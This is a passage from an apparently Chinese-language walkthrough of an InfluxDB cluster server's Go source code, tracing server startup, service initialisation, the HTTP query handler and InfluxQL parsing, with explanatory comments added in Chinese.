If there was an error on startup when creating the logger, output it now.\n\tif logErr != nil {\n\t\tcmd.Logger.Error(\"Unable to configure logger\", zap.Error(logErr))\n\t}\n\n\t// Write the PID file.\n    // 写入pid文件\n\tif err := cmd.writePIDFile(options.PIDFile); err != nil {\n\t\treturn fmt.Errorf(\"write pid file: %s\", err)\n\t}\n\tcmd.pidfile = options.PIDFile\n\n\tif config.HTTPD.PprofEnabled {\n\t\t// Turn on block and mutex profiling.\n\t\truntime.SetBlockProfileRate(int(1 * time.Second))\n\t\truntime.SetMutexProfileFraction(1) // Collect every sample\n\t}\n\n\t// Create server from config and start it.\n    // 初始化服务器\n\tbuildInfo := &BuildInfo{\n\t\tVersion: cmd.Version,\n\t\tCommit:  cmd.Commit,\n\t\tBranch:  cmd.Branch,\n\t\tTime:    cmd.BuildTime,\n\t}\n\ts, err := NewServer(config, buildInfo)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"create server: %s\", err)\n\t}\n\ts.Logger = cmd.Logger\n\ts.CPUProfile = options.CPUProfile\n\ts.MemProfile = options.MemProfile\n     // 启动\n\tif err := s.Open(); err != nil {\n\t\treturn fmt.Errorf(\"open server: %s\", err)\n\t}\n\tcmd.Server = s\n\n\t// Begin monitoring the server's error channel.\n\tgo cmd.monitorServerErrors()\n\n\treturn nil\n}\n```\n\n初始化函数NewServer\n\n```go\n// NewServer returns a new instance of Server built from a config.\nfunc NewServer(c *Config, buildInfo *BuildInfo) (*Server, error) {\n\t// We need to ensure that a meta directory always exists even if\n\t// we don't start the meta store.  node.json is always stored under\n\t// the meta directory.\n    // 建立元数据目录，并加权\n\tif err := os.MkdirAll(c.Meta.Dir, 0777); err != nil {\n\t\treturn nil, fmt.Errorf(\"mkdir all: %s\", err)\n\t}\n\n\t// 0.10-rc1 and prior would sometimes put the node.json at the root\n\t// dir which breaks backup/restore and restarting nodes.  This moves\n\t// the file from the root so it's always under the meta dir.\n    //移动和恢复节点信息\n\toldPath := filepath.Join(filepath.Dir(c.Meta.Dir), \"node.json\")\n\tnewPath := filepath.Join(c.Meta.Dir, \"node.json\")\n\t//修改\n\tif _, err := os.Stat(oldPath); err == nil {\n\t\tif err := os.Rename(oldPath, newPath); err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t}\n// 从磁盘中加载节点信息\n\tnode, err := influxdb.LoadNode(c.Meta.Dir)\n\tif err != nil {\n\t\tif !os.IsNotExist(err) {\n\t\t\treturn nil, err\n\t\t}\n\t\t//不存在则新建\n\t\tnode = influxdb.NewNode(c.Meta.Dir)\n\t}\n\n\t//if err := raftDBExists(c.Meta.Dir); err != nil {\n\t//\treturn nil, err\n\t//}\n\n\t// In 0.10.0 bind-address got moved to the top level. Check\n\t// The old location to keep things backwards compatible\n\tbind := c.BindAddress\n\tif c.Meta.BindAddress != \"\" {\n\t\tbind = c.Meta.BindAddress\n\t}\n\t//判断元数据是否打开\n\tif !c.Data.Enabled && !c.Meta.Enabled {\n\t\treturn nil, fmt.Errorf(\"must run as either meta node or data node or both\")\n\t}\n\t//初始化\n\ts := &Server{\n\t\tbuildInfo: *buildInfo,\n\t\terr:       make(chan error),\n\t\tclosing:   make(chan struct{}),\n\n\t\tNode:        node,\n\t\tBindAddress: bind,\n\n\t\tLogger: logger.New(os.Stderr),\n\n\t\t//MetaClient: meta.NewClient(c.Meta),\n\t\tMetaClient: meta.NewClient(),  \n\n\t\treportingDisabled: c.ReportingDisabled,\n\t\tjoinPeers:         c.Meta.JoinPeers,\n\t\tmetaUseTLS:        c.Meta.HTTPSEnabled,\n\n\t\thttpAPIAddr: c.HTTPD.BindAddress,   // http服务bind地址\n\t\thttpUseTLS:  c.HTTPD.HTTPSEnabled,   //https打开\n\t\ttcpAddr:     bind,\n\n\t\tconfig: c,\n\t}\n\t//初始化元数据服务\n\tif c.Meta.Enabled {\n\t\ts.MetaService = meta.NewService(c.Meta)\n\t\ts.MetaService.Version = s.buildInfo.Version\n\t\ts.MetaService.Node = s.Node\n\t}\n\n\tif c.AdminCluster.Enabled {\n\t\ts.AdminClusterService = admin_cluster.NewService(c.AdminCluster)\n\t\ts.AdminClusterService.Version = s.buildInfo.Version\n\t\ts.AdminClusterService.Handler.MetaClient = s.MetaClient\n\t\ts.AdminClusterService.TCPHandler.MetaClient = s.MetaClient\n\t\ts.AdminClusterService.TCPHandler.Server = s\n\t}\n\t//初始化监控信息\n\ts.Monitor = monitor.New(s, c.Monitor)\n\ts.config.registerDiagnostics(s.Monitor)\n\n\tif c.Data.Enabled {\n        //初始化tsdb\n\t\ts.TSDBStore = tsdb.NewStore(c.Data.Dir)\n\t\ts.TSDBStore.EngineOptions.Config = c.Data\n\n\t\ts.AdminClusterService.TCPHandler.TSDBStore = s.TSDBStore\n\n\t\t// Copy TSDB configuration.\n\t\ts.TSDBStore.EngineOptions.EngineVersion = c.Data.Engine\n\t\ts.TSDBStore.EngineOptions.IndexVersion = c.Data.Index\n\n\t\t// Create the Subscriber service\n\t\ts.Subscriber = subscriber.NewService(c.Subscriber)\n\n\t\t// Set the shard writer\n\t\ts.ShardWriter = cluster.NewShardWriter(time.Duration(c.Cluster.ShardWriterTimeout), c.Cluster.MaxRemoteWriteConnections)\n\n\t\t// Create the hinted handoff service\n\t\ts.HintedHandoff = hh.NewService(c.HintedHandoff, s.ShardWriter, s.MetaClient)\n\t\ts.HintedHandoff.Monitor = s.Monitor\n\n\t\t// Initialize points writer.\n\t\ts.PointsWriter = cluster.NewPointsWriter()\n\t\ts.PointsWriter.WriteTimeout = time.Duration(c.Coordinator.WriteTimeout)\n\t\ts.PointsWriter.TSDBStore = s.TSDBStore\n\t\ts.PointsWriter.ShardWriter = s.ShardWriter\n\t\ts.PointsWriter.HintedHandoff = s.HintedHandoff\n\t\ts.PointsWriter.Node = s.Node\n\n\t\t// Initialize meta executor.\n\t\tmetaExecutor := cluster.NewMetaExecutor()\n\t\tmetaExecutor.MetaClient = s.MetaClient\n\t\tmetaExecutor.Node = s.Node\n\n\t\t// Initialize query executor.\n        // 初始化查询\n\t\ts.QueryExecutor = query.NewExecutor()\n        //初始化集群存储分片\n\t\tclusterShardMapper := &cluster.ClusterShardMapper{\n\t\t\tMetaClient: s.MetaClient,\n\t\t\tTSDBStore:  coordinator.LocalTSDBStore{Store: s.TSDBStore},\n\t\t\tLocalShardMapper: &coordinator.LocalShardMapper{\n\t\t\t\tMetaClient: s.MetaClient,\n\t\t\t\tTSDBStore:  coordinator.LocalTSDBStore{Store: s.TSDBStore},\n\t\t\t},\n\t\t\tNode:               s.Node,\n\t\t\tShardMapperTimeout: time.Duration(s.config.Cluster.ShardMapperTimeout),\n\t\t}\n\t\tclusterShardMapper.WithLogger(s.Logger)\n\t\t//初始化执行\n        //设置最大的查询范围和bucket数目等\n\t\ts.QueryExecutor.StatementExecutor = &cluster.StatementExecutor{\n\t\t\tMetaClient:        s.MetaClient,\n\t\t\tTaskManager:       s.QueryExecutor.TaskManager,\n\t\t\tTSDBStore:         s.TSDBStore,\n\t\t\tShardMapper:       clusterShardMapper,\n\t\t\tMonitor:           s.Monitor,\n\t\t\tPointsWriter:      s.PointsWriter,\n\t\t\tMaxSelectPointN:   c.Coordinator.MaxSelectPointN,\n\t\t\tMaxSelectSeriesN:  c.Coordinator.MaxSelectSeriesN,\n\t\t\tMaxSelectBucketsN: c.Coordinator.MaxSelectBucketsN,\n\t\t\tMetaExecutor:      metaExecutor,\n\t\t}\n\t\ts.QueryExecutor.TaskManager.QueryTimeout = time.Duration(c.Coordinator.QueryTimeout)\n\t\ts.QueryExecutor.TaskManager.LogQueriesAfter = time.Duration(c.Coordinator.LogQueriesAfter)\n\t\ts.QueryExecutor.TaskManager.MaxConcurrentQueries = c.Coordinator.MaxConcurrentQueries\n\n\t\t// Initialize the monitor\n\t\ts.Monitor.Version = s.buildInfo.Version\n\t\ts.Monitor.Commit = s.buildInfo.Commit\n\t\ts.Monitor.Branch = s.buildInfo.Branch\n\t\ts.Monitor.BuildTime = s.buildInfo.Time\n\t\ts.Monitor.PointsWriter = (*monitorPointsWriter)(s.PointsWriter)\n\t}\n\n\treturn s, nil\n}\n```\n\nopen启动服务：\n\n```go\n// Open opens the meta and data store and all services.\nfunc (s *Server) Open() error {\n\t// Start profiling, if set.\n    // linux profile\n\tstartProfile(s.CPUProfile, s.MemProfile)\n\n\t// Open shared TCP connection.\n    // 启动tcp连接\n\tln, err := net.Listen(\"tcp\", s.BindAddress)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"listen: %s\", err)\n\t}\n\ts.Listener = ln\n\n\t// Multiplex listener.\n    // 启动多路复用器\n\tmux := tcp.NewMux()\n\ts.Mux = mux\n\tgo mux.Serve(ln)\n\n\tif s.MetaService != nil {\n        //元数据服务raftlistener初始化\n\t\ts.MetaService.RaftListener = mux.Listen(meta.MuxHeader)\n\n\t\t// Configure logging for all services and clients.\n\t\tif s.config.Meta.LoggingEnabled {\n\t\t\ts.MetaService.WithLogger(s.Logger)\n\t\t}\n\n\t\t// Open meta service.\n        //元数据服务启动\n\t\tif err := s.MetaService.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open meta service: %s\", err)\n\t\t}\n\t\tgo s.monitorErrorChan(s.MetaService.Err())\n\t}\n\n\tif s.AdminClusterService != nil {\n\t\t// Configure logging for all services and clients.\n\t\tif s.config.AdminCluster.ClusterTracing {\n\t\t\ts.AdminClusterService.WithLogger(s.Logger)\n\t\t}\n\t\t// TCP listen\n\t\ts.AdminClusterService.TCPHandler.Listener = s.Mux.Listen(admin_cluster.MuxHeader)\n\n\t\t// Open admin cluster service.\n        //启动集群admin_cluster服务\n\t\tif err := s.AdminClusterService.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open admin cluster service: %s\", err)\n\t\t}\n\t}\n\n\t// initialize MetaClient.\n    //初始化元数据客户端，用于设置集群功能，加入集群等功能。\n\tif err = s.initializeMetaClient(); err != nil {\n\t\treturn err\n\t}\n\n\t// Start the reporting service, if not disabled.\n\t//if !s.reportingDisabled {\n\t//\tgo s.startServerReporting()\n\t//}\n\n\treturn nil\n}\n```\n\ninitializeMetaClient函数中：\n\n```go\n// initializeMetaClient will set the MetaClient and join the node to the cluster if needed\nfunc (s *Server) initializeMetaClient() error {\n\t// It's the first time starting up and we need to either join\n\t// the cluster or initialize this node as the first member\n    //如果每天joinpeers，则返回\n\tif len(s.joinPeers) == 0 {\n\t\t// start up a new single node cluster\n\t\tif s.MetaService == nil {\n\t\t\treturn fmt.Errorf(\"server not set to join existing cluster must run also as a meta node\")\n\t\t}\n\t\ts.MetaClient.SetMetaServers([]string{s.MetaService.HTTPAddr()})\n\t\ts.MetaClient.SetTLS(s.metaUseTLS)\n\t} else {\n\t\tvar err error\n\t\tvar joinPeers []string\n\t\tif s.MetaService != nil {\n\t\t\traddr := s.remoteAddr(s.MetaService.HTTPAddr())\n\t\t\tjoinPeers, err = s.filterAddr(s.joinPeers, raddr)\n\t\t\tif err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t} else {\n\t\t\tjoinPeers = s.joinPeers\n\t\t}\n\t\ts.MetaClient.SetMetaServers(joinPeers)\n\t\ts.MetaClient.SetTLS(s.metaUseTLS)\n\t}\n    //打开client\n\tif err := s.MetaClient.Open(); err != nil {\n\t\treturn err\n\t}\n\n\t// if the node ID is > 0 then we need to initialize the metaclient\n\tif s.Node.GetMetaID() > 0 || s.Node.GetDataID() > 0 {\n\t\ts.MetaClient.WaitForDataChanged()\n\t}\n\tif len(s.joinPeers) > 0 {\n\t\ts.MetaClient.SetMetaServers(s.joinPeers)\n\t}\n\tif s.config.Data.Enabled {\n\n\t\tgo func() {\n\t\t\tt := time.NewTicker(time.Second)\n\t\t\tfor {\n\t\t\t\tselect {\n\t\t\t\tcase <-t.C:\n                    //定时器服务，检查是否打开数据服务\n\t\t\t\t\tif _, err := s.MetaClient.DataNode(s.Node.GetDataID()); err == nil {\n\t\t\t\t\t\toerr := s.OpenDataServer()\n\t\t\t\t\t\tif oerr != nil {\n\t\t\t\t\t\t\ts.Logger.Error(\"failed to open data server.\", zap.Error(oerr))\n\t\t\t\t\t\t\tpanic(\"open data server failed\")\n\t\t\t\t\t\t}\n\t\t\t\t\t\ts.Logger.Info(\"data server started\", zap.Uint64(\"node id\", s.Node.GetDataID()))\n\t\t\t\t\t\treturn\n\t\t\t\t\t}\n\t\t\t\tcase <-s.closing:\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t}\n\t\t}()\n\n\t}\n\treturn nil\n}\n```\n\n如果找到数据节点，则启动opendataServer函数，启动数据服务：\n\n```go\nfunc (s *Server) OpenDataServer() error {\n\tif s.TSDBStore != nil && !s.DataServicesOpened {\n\t\ts.DataServicesOpened = true\n\t\t// Append services.\n         // 启动集群服务，初始化所有的服务\n\t\ts.appendClusterService(s.config.Cluster)\n\t\ts.appendMonitorService()\n\t\ts.appendPrecreatorService(s.config.Precreator)\n\t\ts.appendSnapshotterService()\n\t\ts.appendContinuousQueryService(s.config.ContinuousQuery)\n\t\ts.appendAntiEntropyService(s.config.AntiEntropy)\n        // http服务\n\t\ts.appendHTTPDService(s.config.HTTPD)\n\t\ts.appendStorageService(s.config.Storage)\n        //RetentionPolicy\n\t\ts.appendRetentionPolicyService(s.config.Retention)\n\t\tfor _, i := range s.config.GraphiteInputs {\n\t\t\tif err := s.appendGraphiteService(i); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t}\n\t\tfor _, i := range s.config.CollectdInputs {\n\t\t\ts.appendCollectdService(i)\n\t\t}\n\t\tfor _, i := range s.config.OpenTSDBInputs {\n\t\t\tif err := s.appendOpenTSDBService(i); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t}\n\t\tfor _, i := range s.config.UDPInputs {\n\t\t\ts.appendUDPService(i)\n\t\t}\n\t\t\n\t\ts.Subscriber.MetaClient = s.MetaClient\n\t\ts.PointsWriter.MetaClient = s.MetaClient\n\t\ts.Monitor.MetaClient = s.MetaClient\n\t\ts.ShardWriter.MetaClient = s.MetaClient\n\t\ts.HintedHandoff.MetaClient = s.MetaClient\n\n\t\ts.ClusterService.Listener = s.Mux.Listen(cluster.MuxHeader)\n\t\ts.SnapshotterService.Listener = s.Mux.Listen(snapshotter.MuxHeader)\n\n\t\t// Configure logging for all services and clients.\n\t\tif s.config.Meta.LoggingEnabled {\n\t\t\ts.MetaClient.WithLogger(s.Logger)\n\t\t}\n\t\ts.TSDBStore.WithLogger(s.Logger)\n\t\tif s.config.Data.QueryLogEnabled {\n\t\t\ts.QueryExecutor.WithLogger(s.Logger)\n\t\t}\n\t\ts.PointsWriter.WithLogger(s.Logger)\n\t\ts.Subscriber.WithLogger(s.Logger)\n\t\ts.HintedHandoff.WithLogger(s.Logger)\n\t\tfor _, svc := range s.Services {\n\t\t\tsvc.WithLogger(s.Logger)\n\t\t}\n\t\ts.SnapshotterService.WithLogger(s.Logger)\n\t\ts.Monitor.WithLogger(s.Logger)\n\n\t\t// Open TSDB store.\n        // tsdb启动\n\t\tif err := s.TSDBStore.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open tsdb store: %s\", err)\n\t\t}\n\n\t\t// Open the hinted handoff service\n\t\tif err := s.HintedHandoff.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open hinted handoff: %s\", err)\n\t\t}\n\n\t\t// Open the subscriber service\n\t\tif err := s.Subscriber.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open subscriber: %s\", err)\n\t\t}\n\n\t\t// Open the points writer service\n\t\tif err := s.PointsWriter.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open points writer: %s\", err)\n\t\t}\n\n\t\ts.PointsWriter.AddWriteSubscriber(s.Subscriber.Points())\n\n\t\tfor _, service := range s.Services {\n            //将注册的服务都启动起来，这边调用每个服务的open方法启动起来\n\t\t\tif err := service.Open(); err != nil {\n\t\t\t\treturn fmt.Errorf(\"open service: %s\", err)\n\t\t\t}\n\t\t}\n\t\treturn nil\n\n\t}\n\tif s.TSDBStore == nil {\n\t\treturn fmt.Errorf(\"Data server is not enabled\")\n\t}\n\treturn nil\n}\n```\n\n服务主要有下面这些：\n\n```shell\ncluster\nmonitor\nprecreator\nsnapshotter\ncontinuousquery\nantientropy\nhttp\nstorage\nretentionpolicy\ngraphite\ncollectd\nopentsdb\nudp\nhh\nmeta\n```\n\n每个服务都有open函数，分别启动。\n\n举例来说：\n\nhttp服务初始化函数NewService:\n\n```go\n// NewService returns a new instance of Service.\nfunc NewService(c Config) *Service {\n\ts := &Service{\n\t\taddr:           c.BindAddress,\n\t\thttps:          c.HTTPSEnabled,\n\t\tcert:           c.HTTPSCertificate,\n\t\tkey:            c.HTTPSPrivateKey,\n\t\tlimit:          c.MaxConnectionLimit,\n\t\terr:            make(chan error),\n\t\tunixSocket:     c.UnixSocketEnabled,\n\t\tunixSocketPerm: uint32(c.UnixSocketPermissions),\n\t\tbindSocket:     c.BindSocket,\n\t\tHandler:        NewHandler(c),  //服务启动处理函数\n\t\tLogger:         zap.NewNop(),\n\t}\n\tif s.key == \"\" {\n\t\ts.key = s.cert\n\t}\n\tif c.UnixSocketGroup != nil {\n\t\ts.unixSocketGroup = int(*c.UnixSocketGroup)\n\t}\n\ts.Handler.Logger = s.Logger\n\treturn s\n}\n```\n\nhandler函数：\n\n```go\nfunc NewHandler(c Config) *Handler {\n\th := &Handler{\n\t\tmux:            pat.New(),\n\t\tConfig:         &c,\n\t\tLogger:         zap.NewNop(),\n\t\tCLFLogger:      log.New(os.Stderr, \"[httpd] \", 0),\n\t\tStore:          storage.NewStore(),\n\t\tstats:          &Statistics{},\n\t\trequestTracker: NewRequestTracker(),\n\t\tsema:           make(chan struct{}, 100),\n\t}\n\n\t// Limit the number of concurrent & enqueued write requests.\n\th.writeThrottler = NewThrottler(c.MaxConcurrentWriteLimit, c.MaxEnqueuedWriteLimit)\n\th.writeThrottler.EnqueueTimeout = c.EnqueuedWriteTimeout\n\n\t// Disable the write log if they have been suppressed.\n\twriteLogEnabled := c.LogEnabled\n\tif c.SuppressWriteLog {\n\t\twriteLogEnabled = false\n\t}\n    //所有服务查询的入口函数在这边处理\n    h.AddRoutes([]Route{\n\t\tRoute{\n\t\t\t\"query-options\", // Satisfy CORS checks.\n\t\t\t\"OPTIONS\", \"/query\", false, true, h.serveOptions,\n\t\t},\n\t\tRoute{\n\t\t\t\"query\", // Query serving route.\n\t\t\t\"GET\", \"/query\", true, true, h.serveQuery,\n\t\t},\n\t\tRoute{\n\t\t\t\"query\", // Query serving route.\n\t\t\t\"POST\", \"/query\", true, true, h.serveQuery,\n\t\t},\n\t\tRoute{\n            ....\n\t\"GET\", \"/metrics\", false, true, promhttp.Handler().ServeHTTP,\n\t\t},\n\t}...)\n\n\treturn h\n}\n            \n```\n\n查询函数serveQuery；\n\n```go\n// serveQuery parses an incoming query and, if valid, executes the query.\nfunc (h *Handler) serveQuery(w http.ResponseWriter, r *http.Request, user meta.User) {\n\tatomic.AddInt64(&h.stats.QueryRequests, 1)\n\tdefer func(start time.Time) {\n\t\tatomic.AddInt64(&h.stats.QueryRequestDuration, time.Since(start).Nanoseconds())\n\t}(time.Now())\n\th.requestTracker.Add(r, user)\n\n\t// Retrieve the underlying ResponseWriter or initialize our own.\n\trw, ok := w.(ResponseWriter)\n\tif !ok {\n\t\trw = NewResponseWriter(w, r)\n\t}\n\n\t// Retrieve the node id the query should be executed on.\n\tnodeID, _ := strconv.ParseUint(r.FormValue(\"node_id\"), 10, 64)\n\n\tvar qr io.Reader\n\t// Attempt to read the form value from the \"q\" form value.\n\tif qp := strings.TrimSpace(r.FormValue(\"q\")); qp != \"\" {\n\t\tqr = strings.NewReader(qp)\n\t} else if r.MultipartForm != nil && r.MultipartForm.File != nil {\n\t\t// If we have a multipart/form-data, try to retrieve a file from 'q'.\n\t\tif fhs := r.MultipartForm.File[\"q\"]; len(fhs) > 0 {\n\t\t\tf, err := fhs[0].Open()\n\t\t\tif err != nil {\n\t\t\t\th.httpError(rw, err.Error(), http.StatusBadRequest)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tdefer f.Close()\n\t\t\tqr = f\n\t\t}\n\t}\n\n\tif qr == nil {\n\t\th.httpError(rw, `missing required parameter \"q\"`, http.StatusBadRequest)\n\t\treturn\n\t}\n\n\tepoch := strings.TrimSpace(r.FormValue(\"epoch\"))\n\t// 初始化查询解析器\n\tp := influxql.NewParser(qr)\n\tdb := r.FormValue(\"db\")\n\n\t// Sanitize the request query params so it doesn't show up in the response logger.\n\t// Do this before anything else so a parsing error doesn't leak passwords.\n\tsanitize(r)\n\n\t// Parse the parameters\n\trawParams := r.FormValue(\"params\")\n\tif rawParams != \"\" {\n\t\tvar params map[string]interface{}\n\t\tdecoder := json.NewDecoder(strings.NewReader(rawParams))\n\t\tdecoder.UseNumber()\n\t\tif err := decoder.Decode(&params); err != nil {\n\t\t\th.httpError(rw, \"error parsing query parameters: \"+err.Error(), http.StatusBadRequest)\n\t\t\treturn\n\t\t}\n\n\t\t// Convert json.Number into int64 and float64 values\n\t\tfor k, v := range params {\n\t\t\tif v, ok := v.(json.Number); ok {\n\t\t\t\tvar err error\n\t\t\t\tif strings.Contains(string(v), \".\") {\n\t\t\t\t\tparams[k], err = v.Float64()\n\t\t\t\t} else {\n\t\t\t\t\tparams[k], err = v.Int64()\n\t\t\t\t}\n\n\t\t\t\tif err != nil {\n\t\t\t\t\th.httpError(rw, \"error parsing json value: \"+err.Error(), http.StatusBadRequest)\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tp.SetParams(params)\n\t}\n\n\t// Parse query from query string.\n    //开始解析query查询语句\n\tq, err := p.ParseQuery()\n\tif err != nil {\n\t\th.httpError(rw, \"error parsing query: \"+err.Error(), http.StatusBadRequest)\n\t\treturn\n\t}\n\n\t// Check authorization.\n    //检查认证信息\n\tif h.Config.AuthEnabled {\n\t\tif err := h.QueryAuthorizer.AuthorizeQuery(user, q, db); err != nil {\n\t\t\tif err, ok := err.(meta.ErrAuthorize); ok {\n\t\t\t\th.Logger.Info(\"Unauthorized request\",\n\t\t\t\t\tzap.String(\"user\", err.User),\n\t\t\t\t\tzap.Stringer(\"query\", err.Query),\n\t\t\t\t\tlogger.Database(err.Database))\n\t\t\t}\n\t\t\th.httpError(rw, \"error authorizing query: \"+err.Error(), http.StatusForbidden)\n\t\t\treturn\n\t\t}\n\t}\n\n\t// Parse chunk size. Use default if not provided or unparsable.\n\tchunked := r.FormValue(\"chunked\") == \"true\"\n\tchunkSize := DefaultChunkSize\n\tif chunked {\n\t\tif n, err := strconv.ParseInt(r.FormValue(\"chunk_size\"), 10, 64); err == nil && int(n) > 0 {\n\t\t\tchunkSize = int(n)\n\t\t}\n\t}\n\n\t// Parse whether this is an async command.\n\tasync := r.FormValue(\"async\") == \"true\"\n//参数实例化\n\topts := query.ExecutionOptions{\n\t\tDatabase:        db,\n\t\tRetentionPolicy: r.FormValue(\"rp\"),\n\t\tChunkSize:       chunkSize,\n\t\tReadOnly:        r.Method == \"GET\",\n\t\tNodeID:          nodeID,\n\t}\n\n\tif h.Config.AuthEnabled {\n\t\t// The current user determines the authorized actions.\n\t\topts.Authorizer = user\n\t} else {\n\t\t// Auth is disabled, so allow everything.\n\t\topts.Authorizer = query.OpenAuthorizer\n\t}\n\n\t// Make sure if the client disconnects we signal the query to abort\n\tvar closing chan struct{}\n\tif !async {\n\t\tclosing = make(chan struct{})\n\t\tif notifier, ok := w.(http.CloseNotifier); ok {\n\t\t\t// CloseNotify() is not guaranteed to send a notification when the query\n\t\t\t// is closed. Use this channel to signal that the query is finished to\n\t\t\t// prevent lingering goroutines that may be stuck.\n\t\t\tdone := make(chan struct{})\n\t\t\tdefer close(done)\n\n\t\t\tnotify := notifier.CloseNotify()\n\t\t\tgo func() {\n\t\t\t\t// Wait for either the request to finish\n\t\t\t\t// or for the client to disconnect\n\t\t\t\tselect {\n\t\t\t\tcase <-done:\n\t\t\t\tcase <-notify:\n\t\t\t\t\tclose(closing)\n\t\t\t\t}\n\t\t\t}()\n\t\t\topts.AbortCh = done\n\t\t} else {\n\t\t\tdefer close(closing)\n\t\t}\n\t}\n\n\t// Execute query.\n    //执行查询语句\n\tresults := h.QueryExecutor.ExecuteQuery(q, opts, closing)\n\n\t// If we are running in async mode, open a goroutine to drain the results\n\t// and return with a StatusNoContent.\n\tif async {\n\t\tgo h.async(q, results)\n\t\th.writeHeader(w, http.StatusNoContent)\n\t\treturn\n\t}\n\n\t// if we're not chunking, this will be the in memory buffer for all results before sending to client\n\tresp := Response{Results: make([]*query.Result, 0)}\n\n\t// Status header is OK once this point is reached.\n\t// Attempt to flush the header immediately so the client gets the header information\n\t// and knows the query was accepted.\n\th.writeHeader(rw, http.StatusOK)\n\tif w, ok := w.(http.Flusher); ok {\n\t\tw.Flush()\n\t}\n\n\t// pull all results from the channel\n\trows := 0\n\tfor r := range results {\n\t\t// Ignore nil results.\n\t\tif r == nil {\n\t\t\tcontinue\n\t\t}\n\n\t\t// if requested, convert result timestamps to epoch\n\t\tif epoch != \"\" {\n\t\t\tconvertToEpoch(r, epoch)\n\t\t}\n\n\t\t// Write out result immediately if chunked.\n\t\tif chunked {\n\t\t\tn, _ := rw.WriteResponse(Response{\n\t\t\t\tResults: []*query.Result{r},\n\t\t\t})\n\t\t\tatomic.AddInt64(&h.stats.QueryRequestBytesTransmitted, int64(n))\n\t\t\tw.(http.Flusher).Flush()\n\t\t\tcontinue\n\t\t}\n\n\t\t// Limit the number of rows that can be returned in a non-chunked\n\t\t// response.  This is to prevent the server from going OOM when\n\t\t// returning a large response.  If you want to return more than the\n\t\t// default chunk size, then use chunking to process multiple blobs.\n\t\t// Iterate through the series in this result to count the rows and\n\t\t// truncate any rows we shouldn't return.\n        //最大限制数目\n\t\tif h.Config.MaxRowLimit > 0 {\n\t\t\tfor i, series := range r.Series {\n\t\t\t\tn := h.Config.MaxRowLimit - rows\n\t\t\t\tif n < len(series.Values) {\n\t\t\t\t\t// We have reached the maximum number of values. Truncate\n\t\t\t\t\t// the values within this row.\n\t\t\t\t\tseries.Values = series.Values[:n]\n\t\t\t\t\t// Since this was truncated, it will always be a partial return.\n\t\t\t\t\t// Add this so the client knows we truncated the response.\n\t\t\t\t\tseries.Partial = true\n\t\t\t\t}\n\t\t\t\trows += len(series.Values)\n\n\t\t\t\tif rows >= h.Config.MaxRowLimit {\n\t\t\t\t\t// Drop any remaining series since we have already reached the row limit.\n\t\t\t\t\tif i < len(r.Series) {\n\t\t\t\t\t\tr.Series = r.Series[:i+1]\n\t\t\t\t\t}\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t// It's not chunked so buffer results in memory.\n\t\t// Results for statements need to be combined together.\n\t\t// We need to check if this new result is for the same statement as\n\t\t// the last result, or for the next statement\n\t\tl := len(resp.Results)\n\t\tif l == 0 {\n\t\t\tresp.Results = append(resp.Results, r)\n\t\t} else if resp.Results[l-1].StatementID == r.StatementID {\n\t\t\tif r.Err != nil {\n\t\t\t\tresp.Results[l-1] = r\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tcr := resp.Results[l-1]\n\t\t\trowsMerged := 0\n\t\t\tif len(cr.Series) > 0 {\n\t\t\t\tlastSeries := cr.Series[len(cr.Series)-1]\n\n\t\t\t\tfor _, row := range r.Series {\n\t\t\t\t\tif !lastSeries.SameSeries(row) {\n\t\t\t\t\t\t// Next row is for a different series than last.\n\t\t\t\t\t\tbreak\n\t\t\t\t\t}\n\t\t\t\t\t// Values are for the same series, so append them.\n\t\t\t\t\tlastSeries.Values = append(lastSeries.Values, row.Values...)\n\t\t\t\t\trowsMerged++\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t// Append remaining rows as new rows.\n\t\t\tr.Series = r.Series[rowsMerged:]\n\t\t\tcr.Series = append(cr.Series, r.Series...)\n\t\t\tcr.Messages = append(cr.Messages, r.Messages...)\n\t\t\tcr.Partial = r.Partial\n\t\t} else {\n\t\t\tresp.Results = append(resp.Results, r)\n\t\t}\n\n\t\t// Drop out of this loop and do not process further results when we hit the row limit.\n\t\tif h.Config.MaxRowLimit > 0 && rows >= h.Config.MaxRowLimit {\n\t\t\t// If the result is marked as partial, remove that partial marking\n\t\t\t// here. While the series is partial and we would normally have\n\t\t\t// tried to return the rest in the next chunk, we are not using\n\t\t\t// chunking and are truncating the series so we don't want to\n\t\t\t// signal to the client that we plan on sending another JSON blob\n\t\t\t// with another result.  The series, on the other hand, still\n\t\t\t// returns partial true if it was truncated or had more data to\n\t\t\t// send in a future chunk.\n\t\t\tr.Partial = false\n\t\t\tbreak\n\t\t}\n\t}\n\n\t// If it's not chunked we buffered everything in memory, so write it out\n\tif !chunked {\n\t\tn, _ := rw.WriteResponse(resp)\n\t\tatomic.AddInt64(&h.stats.QueryRequestBytesTransmitted, int64(n))\n\t}\n}\n```\n\n函数ParseQuery函数解析query：\n\n```go\n// ParseQuery parses an InfluxQL string and returns a Query AST object.\nfunc (p *Parser) ParseQuery() (*Query, error) {\n\tvar statements Statements\n\tsemi := true\n\n\tfor {\n\t\tif tok, pos, lit := p.ScanIgnoreWhitespace(); tok == EOF {//如果tok==EOF的时候，正常解析完成返回;\n\t\t\treturn &Query{Statements: statements}, nil\n\t\t} else if tok == SEMICOLON {\n\t\t\tsemi = true\n\t\t} else {\n\t\t\tif !semi {\n\t\t\t\treturn nil, newParseError(tokstr(tok, lit), []string{\";\"}, pos)\n\t\t\t}\n\t\t\tp.Unscan()\n\t\t\ts, err := p.ParseStatement() //解析词\n\t\t\tif err != nil {\n\t\t\t\treturn nil, 